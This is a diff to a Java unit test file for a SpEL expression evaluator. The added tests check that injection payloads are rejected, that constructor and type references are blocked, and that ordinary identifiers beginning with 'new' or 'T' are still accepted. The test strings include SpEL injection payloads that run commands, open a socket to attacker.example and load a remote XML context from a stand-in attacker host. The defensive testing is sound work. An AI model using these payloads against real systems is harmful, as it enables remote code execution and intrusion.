@@ -39,6 +39,9 @@ import org.junit.jupiter.api.Test;
 import org.junit.jupiter.api.extension.ExtendWith;
 import org.junit.jupiter.params.ParameterizedTest;
 import org.junit.jupiter.params.provider.ValueSource;
+import org.springframework.expression.spel.SpelEvaluationException;
+import org.springframework.expression.spel.standard.SpelExpressionParser;
+import org.springframework.expression.spel.support.StandardEvaluationContext;
 
 /**
  * @author Arik Cohen
@@ -545,19 +548,95 @@ public class SpelEvaluatorTest {
     @ValueSource(strings = {
         "=T (java.lang.Runtime).getRuntime ().exec ('calc')",
         "=T\t(java.lang.Integer).valueOf(number)",
+        "=T (java.lang.System).out",
+        "=T (java.lang.System).getProperty ('user.home')",
         "=${localDateTime} .getHour ()",
         "=new org.springframework.context.support.ClassPathXmlApplicationContext('https://attacker.example/evil.xml')",
         "=new org.springframework.context.support.ClassPathXmlApplicationContext ('https://attacker.example/evil.xml')",
         "=new ProcessBuilder('calc')",
         "=new ProcessBuilder({'sh','-c','id'}) .start ()",
         "=new java.io.FileOutputStream('/tmp/pwned')",
-        "=new java.net.Socket('attacker.example', 1337)"
+        "=new java.net.Socket('attacker.example', 1337)",
+        "=new\tProcessBuilder('calc')",
+        "=(new ProcessBuilder('calc'))",
+        "=new java.lang.String('x') + new java.lang.String('y')",
+        "={1,2,3}.![T (java.lang.System)]",
+        "={1,2,3}.?[#this > T (java.lang.Integer).parseInt ('1')]"
     })
     void testShouldRejectSpelInjectionPayloads(String payload) {
         assertThrowsExactly(
             IllegalArgumentException.class,
             () -> EVALUATOR.evaluate(Map.of("value", payload), Collections.emptyMap()),
             payload);
+    }
+
+    @Test
+    void testBeanReferenceIsSilentlyRejectedAtRuntime() {
+        Map<String, Object> map = EVALUATOR.evaluate(
+            Map.of("value", "=@dangerousService"), Collections.emptyMap());
+
+        assertEquals("=@dangerousService", MapUtils.get(map, "value"));
+    }
+
+    @Test
+    void testCreateEvaluationContextBlocksConstructorInvocations() {
+        SpelEvaluator evaluator = (SpelEvaluator) SpelEvaluator.create();
+        StandardEvaluationContext context = evaluator.createEvaluationContext(Collections.emptyMap(), true);
+        SpelExpressionParser parser = new SpelExpressionParser();
+
+        assertThrowsExactly(
+            SpelEvaluationException.class,
+            () -> parser.parseExpression("new java.lang.String('hello')")
+                .getValue(context));
+        assertThrowsExactly(
+            SpelEvaluationException.class,
+            () -> parser.parseExpression("new ProcessBuilder('calc')")
+                .getValue(context));
+        assertThrowsExactly(
+            SpelEvaluationException.class,
+            () -> parser.parseExpression(
+                "new org.springframework.context.support.ClassPathXmlApplicationContext('https://x/evil.xml')")
+                .getValue(context));
+    }
+
+    @Test
+    void testCreateEvaluationContextBlocksTypeReferences() {
+        SpelEvaluator evaluator = (SpelEvaluator) SpelEvaluator.create();
+        StandardEvaluationContext context = evaluator.createEvaluationContext(Collections.emptyMap(), true);
+        SpelExpressionParser parser = new SpelExpressionParser();
+
+        assertThrowsExactly(
+            SpelEvaluationException.class,
+            () -> parser.parseExpression("T(java.lang.System)")
+                .getValue(context));
+        assertThrowsExactly(
+            SpelEvaluationException.class,
+            () -> parser.parseExpression("T(java.lang.Runtime).getRuntime()")
+                .getValue(context));
+    }
+
+    @ParameterizedTest
+    @ValueSource(strings = {
+        "newCustomer",
+        "newOrder.amount",
+        "newItems[0]",
+        "Tx",
+        "T_count",
+        "T1.value"
+    })
+    void testShouldAcceptIdentifiersResemblingReservedKeywords(String accessor) {
+        Map<String, Object> contextMap = new HashMap<>();
+
+        contextMap.put("newCustomer", "Alice");
+        contextMap.put("newOrder", Map.of("amount", 42));
+        contextMap.put("newItems", List.of("first"));
+        contextMap.put("Tx", "tx-value");
+        contextMap.put("T_count", 7);
+        contextMap.put("T1", Map.of("value", "ok"));
+
+        assertDoesNotThrow(
+            () -> EVALUATOR.evaluate(Map.of("value", "${" + accessor + "}"), contextMap),
+            accessor);
     }
 
     @ParameterizedTest
